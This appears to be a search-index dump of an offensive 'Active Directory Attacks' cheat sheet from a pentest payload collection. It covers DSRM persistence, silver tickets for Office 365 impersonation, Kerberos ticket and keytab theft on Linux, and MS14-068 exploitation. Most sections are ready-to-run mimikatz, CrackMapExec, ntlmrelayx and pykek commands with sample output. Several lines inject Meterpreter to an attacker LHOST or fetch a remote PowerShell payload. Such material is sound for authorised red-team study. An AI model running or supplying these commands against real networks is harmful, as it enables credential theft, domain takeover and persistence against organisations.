\\Boot\\x64\\Images\\LiteTouchPE_x64.wim Launch TFTP download Transfer succeeded. Parse wim files to find interesting data Open LiteTouchPE_x86.wim Finding Bootstrap.ini DeployRoot = \\LAB-MDT\\DeploymentShare$ UserID = MdtService UserPassword = Somepass1 ``` DNS Reconnaissance Perform ADIDNS searches StandIn.exe --dns --limit 20 StandIn.exe --dns --filter SQL --limit 10 StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e DSRM Credentials Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database. This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user. Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' # Check if the key exists and get the value Get-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior # Create key with value \"2\" if it doesn't exist New-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD # Change value to \"2\" Set-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 Impersonating Office 365 Users on Azure AD Connect Prerequisites: Obtain NTLM password hash of the AZUREADSSOACC account powershell mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit AAD logon name of the user we want to impersonate (userPrincipalName or mail) powershell elrond@contoso.com SID of the user we want to impersonate powershell S-1-5-21-2121516926-2695913149-3163778339-1234 Create the Silver Ticket and inject it into Kerberos cache: mimikatz.exe \"kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit Launch Mozilla Firefox, go to about:config network.negotiate-auth.trusted-uris=\"https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com\". Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER. Linux Active Directory CCACHE ticket reuse from /tmp When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions List the current ticket used for authentication with env | grep KRB5CCNAME . The format is portable and the ticket can be reused by setting the environment variable with export KRB5CCNAME=/tmp/ticket.ccache . Kerberos ticket name format is krb5cc_%{uid} where uid is the user UID. $ ls /tmp/ | grep krb5cc krb5cc_1000 krb5cc_1569901113 krb5cc_1569901115 $ export KRB5CCNAME=/tmp/krb5cc_1569901115 CCACHE ticket reuse from keyring Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey # Configuration and build git clone https://github.com/TarlogicSecurity/tickey cd tickey/tickey make CONF=Release [root@Lab-LSV01 /]# /tmp/tickey -i [*] krb5 ccache_name = KEYRING:session:sess_%{uid} [+] root detected, so... DUMP ALL THE TICKETS!! [*] Trying to inject in tarlogic[1000] session... [+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache [*] Trying to inject in velociraptor[1120601115] session... [+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache [*] Trying to inject in trex[1120601113] session... [+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache [X] [uid:0] Error retrieving tickets CCACHE ticket reuse from SSSD KCM SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb . The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey . By default, the key is only readable if you have root permissions. Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets. git clone https://github.com/fireeye/SSSDKCMExtractor python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus. CCACHE ticket reuse from keytab git clone https://github.com/its-a-feature/KeytabParser python KeytabParser.py /etc/krb5.keytab klist -k /etc/krb5.keytab Extract accounts from /etc/krb5.keytab The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. Use klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user. $ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab [...] [26] Service principal: host/COMPUTER@DOMAIN KVNO: 25 Key type: 23 Key: 31d6cfe0d16ae931b73c59d7e0c089c0 Time stamp: Oct 07, 2019 09:12:02 [...] On Linux you can use KeyTabExtract : we want RC4 HMAC hash to reuse the NLTM hash. $ python3 keytabextract.py krb5.keytab [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck [+] Keytab File successfully imported. REALM : DOMAIN SERVICE PRINCIPAL : host/computer.domain NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky On macOS you can use bifrost . ./bifrost -action dump -source keytab -path test Connect to the machine using the account and the hash with CME. $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\" CME 10.XXX.XXX.XXX:445 HOSTNAME-01 [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0 References Explain like I\u2019m 5: Kerberos - Apr 2, 2013 - @roguelynn Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema Abusing Kerberos: Kerberoasting - Haboob Team Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh BlueHat IL - Benjamin Delpy COMPROMISSION DES POSTES DE TRAVAIL GR\u00c2CE \u00c0 LAPS ET PXE MISC n\u00b0 103 - mai 2019 - R\u00e9mi Escourrou, Cyprien Oger Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss DiskShadow The return of VSS Evasion Persistence and AD DB extraction Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin Dumping Domain Password Hashes - Pentestlab Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace Exploiting PrivExchange - April 11, 2019 - @chryzsh Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019 Finding Passwords in SYSVOL & Exploiting Group Policy Preferences How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf Fun with LDAP, Kerberos (and MSRPC) in AD Environments Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r Golden ticket - Pentestlab How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018 Invoke-Kerberoast - Powersploit Read the docs Kerberoasting - Part 1 - Mubix \u201cRob\u201d Fuller Passing the hash with native RDP client (mstsc.exe) Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView) Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView Pen Testing Active Directory Environments - Part III: Chasing Power Users Pen Testing Active Directory Environments - Part IV: Graph Fun Pen Testing Active Directory Environments - Part V: Admins and Graphs Pen Testing Active Directory Environments - Part VI: The Final Case Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave Roasting AS-REPs - January 17, 2017 - harmj0y Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher Using bloodhound to map the user network - Hausec WHAT\u2019S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 1 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 2 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 3 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 4 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 5 Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami [PrivExchange] From user to domain admin in less than 60sec ! - davy Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P\u00c9REZ Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018 Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon Playing with Relayed Credentials - June 27, 2018 Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019 How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous SMB Share \u2013 SCF File Attacks - December 13, 2017 - @netbiosX Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema A Red Teamer\u2019s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0 Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10 Active-Directory-Exploitation-Cheat-Sheet - @buftas GPO Abuse - Part 1 - RastaMouse - 6 January 2019 GPO Abuse - Part 2 - RastaMouse - 13 January 2019 Abusing GPO Permissions - harmj0y - March 17, 2016 How To Attack Kerberos 101 - m0chan - July 31, 2019 ACE to RCE - @JustinPerdok - July 24, 2020 Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020 Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Practical Exploitation - Jake Karnes - December 8th, 2020 CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Theory - Jake Karnes - December 8th, 2020 Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory GPO Abuse: \"You can't see me\" - Huy Kha - July 19, 2019 Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017 New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018 Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17 Playing with PrintNightmare - 0xdf - Jul 8, 2021 Attacking Active Directory: 0 to 0.9 - Eloy P\u00e9rez Gonz\u00e1lez - 2021/05/29 Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021 Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021 NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_ Certified Pre-Owned - Will Schroeder - Jun 17 2021 AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021 NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021 UnPAC the hash - The Hacker Recipes Lateral Movement \u2013 WebClient Shadow Credentials: Workstation Takeover Edition - Matthew Creel Certificate templates - The Hacker Recipes CA configuration - The Hacker Recipes Access controls - The Hacker Recipes Web endpoints - The Hacker Recipes sAMAccountName spoofing - The Hacker Recipes CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph ADCS: Playing with ESC4 - Matthew Creel The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022 AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022 Introducing MalSCCM - Phil Keeble -May 4, 2022 Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak bloodyAD and CVE-2022-26923 - soka - 11 May 2022 DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal Shadow Credentials - The Hacker Recipes","title":"Active Directory Attacks"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-attacks","text":"","title":"Active Directory Attacks"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#summary","text":"Active Directory Attacks Summary Tools Active Directory Recon Using BloodHound Using PowerView Using AD Module Most common paths to AD compromise MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability) From CVE to SYSTEM shell on DC ZeroLogon PrintNightmare samAccountName spoofing Open Shares SCF and URL file attack against writeable share SCF Files URL Files Windows Library Files Windows Search Connectors Files Passwords in SYSVOL & Group Policy Preferences Exploit Group Policy Objects GPO Find vulnerable GPO Abuse GPO with SharpGPOAbuse Abuse GPO with PowerGPOAbuse Abuse GPO with pyGPOAbuse Abuse GPO with PowerView Abuse GPO with StandIn Dumping AD Domain Credentials Using ndtsutil Using Vshadow Using vssadmin Using DiskShadow (a Windows signed binary) Using esentutl.exe Extract hashes from ntds.dit Alternatives - modules Using Mimikatz DCSync Using Mimikatz sekurlsa Crack NTLM hashes with hashcat User Hunting Password spraying Kerberos pre-auth bruteforcing Spray a pre-generated passwords list Spray passwords against the RDP service BadPwdCount attribute Password in AD User comment Password of Pre-Created Computer Account Reading LAPS Password Reading GMSA Password Forging Golden GMSA Pass-the-Ticket Golden Tickets Using Mimikatz Using Meterpreter Using a ticket on Linux Pass-the-Ticket Silver Tickets Kerberoasting KRB_AS_REP Roasting Pass-the-Hash OverPass-the-Hash (pass the key) Using impacket Using Rubeus Capturing and cracking Net-NTLMv1/NTLMv1 hashes Capturing and cracking Net-NTLMv2/NTLMv2 hashes Man-in-the-Middle attacks & relaying MS08-068 NTLM reflection SMB Signing Disabled and IPv4 SMB Signing Disabled and IPv6 Drop the MIC Ghost Potato - CVE-2019-1384 RemotePotato0 DCOM DCE RPC relay DNS Poisonning - Relay delegation with mitm6 Relaying with WebDav Trick Active Directory Certificate Services ESC1 - Misconfigured Certificate Templates ESC2 - Misconfigured Certificate Templates ESC3 - Misconfigured Enrollment Agent Templates ESC4 - Access Control Vulnerabilities ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 - Vulnerable Certificate Authority Access Control ESC8 - AD CS Relay Attack Certifried CVE-2022-26923 Pass-The-Certificate UnPAC The Hash Shadow Credentials Dangerous Built-in Groups Usage Abusing DNS Admins Group Abusing Active Directory ACLs/ACEs GenericAll GenericWrite GenericWrite and Remote Connection Manager WriteDACL WriteOwner ReadLAPSPassword ReadGMSAPassword ForceChangePassword DCOM Exploitation DCOM via MMC Application Class DCOM via Excel DCOM via ShellExecute Trust relationship between domains Child Domain to Forest Compromise - SID Hijacking Forest to Forest Compromise - Trust Ticket Privileged Access Management (PAM) Trust Kerberos Unconstrained Delegation SpoolService Abuse with Unconstrained Delegation MS-EFSRPC Abuse with Unconstrained Delegation Kerberos Constrained Delegation Kerberos Resource Based Constrained Delegation Kerberos Bronze Bit Attack - CVE-2020-17049 PrivExchange attack SCCM Deployment WSUS Deployment RODC - Read Only Domain Controller Compromise PXE Boot image attack DSRM Credentials DNS Reconnaissance Impersonating Office 365 Users on Azure AD Connect Linux Active Directory CCACHE ticket reuse from /tmp CCACHE ticket reuse from keyring CCACHE ticket reuse from SSSD KCM CCACHE ticket reuse from keytab Extract accounts from /etc/krb5.keytab References","title":"Summary"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#tools","text":"Impacket or the Windows version Responder InveighZero Mimikatz Ranger AdExplorer CrackMapExec ```powershell # use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443 root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -M web_delivery -o URL=\"https://IP:PORT/posh-payload\" root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -X 'whoami' root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz root@payload$ cme mimikatz --server http --server-port 80 ``` Mitm6 bash git clone https://github.com/fox-it/mitm6.git && cd mitm6 pip install . mitm6 -d lab.local ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i # -wh: Server hosting WPAD file (Attacker\u2019s IP) # -t: Target (You cannot relay credentials to the same device that you\u2019re spoofing) # -i: open an interactive shell ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access ADRecon powershell .\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser Active Directory Assessment and Privilege Escalation Script powershell powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 Ping Castle powershell pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession pingcastle.exe --healthcheck --server domain.local pingcastle.exe --graph --server domain.local pingcastle.exe --scanner scanner_name --server domain.local available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users Kerbrute powershell ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD> Rubeus powershell Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID] Rubeus.exe klist [/luid:LOGINID] Rubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] AutomatedLab powershell New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD' Install-Lab Show-LabDeploymentSummary","title":"Tools"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-recon","text":"","title":"Active Directory Recon"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-bloodhound","text":"Use the correct collector * AzureHound for Azure Active Directory * SharpHound for local Active Directory use AzureHound powershell # require: Install-Module -name Az -AllowClobber # require: Install-Module -name AzureADPreview -AllowClobber Connect-AzureAD Connect-AzAccount . .\\AzureHound.ps1 Invoke-AzureHound use BloodHound ```powershell # run the collector on the machine using SharpHound.exe # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .\\SharpHound.exe -c all -d active.htb --searchforest .\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default .\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy) .\\SharpHound.exe -c all --LdapUsername --LdapPassword --JSONFolder .\\SharpHound.exe -c all --LdapUsername --LdapPassword --domaincontroller 10.10.10.100 -d active.htb .\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23 # or run the collector on the machine using Powershell # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public Invoke-BloodHound -CollectionMethod All -LDAPUser -LDAPPass -OutputDirectory # or remotely via BloodHound Python # https://github.com/fox-it/BloodHound.py pip install bloodhound bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all * Collect more data for certificates exploitation using Certipy ps1 certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound ``` Then import the zip/json files into the Neo4J database and query them. root@payload$ apt install bloodhound # start BloodHound and the database root@payload$ neo4j console # or use docker root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j root@payload$ ./bloodhound --no-sandbox Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j You can add some custom queries like : * Bloodhound-Custom-Queries from @hausec * BloodHoundQueries from CompassSecurity * BloodHound Custom Queries from Exegol - @ShutdownRepo * Certipy BloodHound Custom Queries from ly4k Replace the customqueries.json file located at /home/username/.config/bloodhound/customqueries.json or C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json .","title":"Using BloodHound"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-powerview","text":"Get Current Domain: Get-NetDomain Enum Other Domains: Get-NetDomain -Domain <DomainName> Get Domain SID: Get-DomainSID Get Domain Policy: ```powershell Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos (Get-DomainPolicy).\"system access\" (Get-DomainPolicy).\"kerberos policy\" - **Get Domain Controlers:** powershell Get-NetDomainController Get-NetDomainController -Domain - **Enumerate Domain Users:** powershell Get-NetUser Get-NetUser -SamAccountName Get-NetUser | select cn Get-UserProperty #Check last password change Get-UserProperty -Properties pwdlastset #Get a spesific \"string\" on a user's attribute Find-UserField -SearchField Description -SearchTerm \"wtver\" #Enumerate user logged on a machine Get-NetLoggedon -ComputerName #Enumerate Session Information for a machine Get-NetSession -ComputerName #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain | Select-Object UserName, SessionFromName - **Enum Domain Computers:** powershell Get-NetComputer -FullData Get-DomainGroup #Enumerate Live machines Get-NetComputer -Ping - **Enum Groups and Group Members:** powershell Get-NetGroupMember -GroupName \" \" -Domain #Enumerate the members of a specified group of the domain Get-DomainGroup -Identity | Select-Object -ExpandProperty Member #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName - **Enumerate Shares** powershell #Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess - **Enum Group Policies:** powershell Get-NetGPO # Shows active Policy on specified machine Get-NetGPO -ComputerName Get-NetGPOGroup #Get users that are part of a Machine's local Admin group Find-GPOComputerAdmin -ComputerName - **Enum OUs:** powershell Get-NetOU -FullData Get-NetGPO -GPOname - **Enum ACLs:** powershell # Returns the ACLs associated with the specified account Get-ObjectAcl -SamAccountName -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose #Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path \"\\Path\\Of\\A\\Share\" - **Enum Domain Trust:** powershell Get-NetDomainTrust Get-NetDomainTrust -Domain - **Enum Forest Trust:** powershell Get-NetForestDomain Get-NetForestDomain Forest #Domains of Forest Enumeration Get-NetForestDomain Get-NetForestDomain Forest #Map the Trust of the Forest Get-NetForestTrust Get-NetDomainTrust -Forest - **User Hunting:** powershell #Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain: Invoke-EnumerateLocalAdmin -Verbose #Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -Stealth #Confirming admin access: Invoke-UserHunter -CheckAccess ``` :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: \\ I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit! PowerView 3.0 Tricks","title":"Using PowerView"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-ad-module","text":"Get Current Domain: Get-ADDomain Enum Other Domains: Get-ADDomain -Identity <Domain> Get Domain SID: Get-DomainSID Get Domain Controlers: powershell Get-ADDomainController Get-ADDomainController -Identity <DomainName> Enumerate Domain Users: ```powershell Get-ADUser -Filter * -Identity -Properties * #Get a spesific \"string\" on a user's attribute Get-ADUser -Filter 'Description -like \" wtver \"' -Properties Description | select Name, Description - **Enum Domain Computers:** powershell Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter * - **Enum Domain Trust:** powershell Get-ADTrust -Filter * Get-ADTrust -Identity - **Enum Forest Trust:** powershell Get-ADForest Get-ADForest -Identity #Domains of Forest Enumeration (Get-ADForest).Domains - **Enum Local AppLocker Effective Policy:** powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections ```","title":"Using AD Module"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#other-interesting-commands","text":"Find Domain Controllers ps1 nslookup domain.com nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com nltest /dclist:domain.com Get-ADDomainController -filter * | Select-Object name gpresult /r $Env:LOGONSERVER echo %LOGONSERVER%","title":"Other Interesting Commands"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#most-common-paths-to-ad-compromise","text":"","title":"Most common paths to AD compromise"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms14-068-microsoft-kerberos-checksum-validation-vulnerability","text":"This exploit require to know the user SID, you can use rpcclient to remotely get it or wmi if you have an access on the machine. # remote rpcclient $> lookupnames john.smith john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1) # loc wmic useraccount get name,sid Administrator S-1-5-21-3415849876-833628785-5197346142-500 Guest S-1-5-21-3415849876-833628785-5197346142-501 Administrator S-1-5-21-297520375-2634728305-5197346142-500 Guest S-1-5-21-297520375-2634728305-5197346142-501 krbtgt S-1-5-21-297520375-2634728305-5197346142-502 lambda S-1-5-21-297520375-2634728305-5197346142-1110 # powerview Convert-NameToSid high-sec-corp.localkrbtgt S-1-5-21-2941561648-383941485-1389968811-502 Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068 Generate a ticket with metasploit or pykek Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN LABDOMAIN.LOCAL yes The Domain (upper case) Ex: DEMO.LOCAL PASSWORD P@ssw0rd yes The Domain User password RHOSTS 10.10.10.10 yes The target address range or CIDR identifier RPORT 88 yes The target port Timeout 10 yes The TCP timeout to establish connection and read data USER lambda yes The Domain User USER_SID S-1-5-21-297520375-2634728305-5197346142-1106 yes The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000 # Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek $ git clone https://github.com/SecWiki/windows-kernel-exploits $ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword> $ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org $ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10 $ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066 -1105 [+] Building AS-REQ for msfdc01.metasploitable.local... Done! [+] Sending AS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving AS-REP from msfdc01.metasploitable.local... Done! [+] Parsing AS-REP from msfdc01.metasploitable.local... Done! [+] Building TGS-REQ for msfdc01.metasploitable.local... Done! [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done! [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done! [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done! Then use mimikatz to load the ticket. mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\" 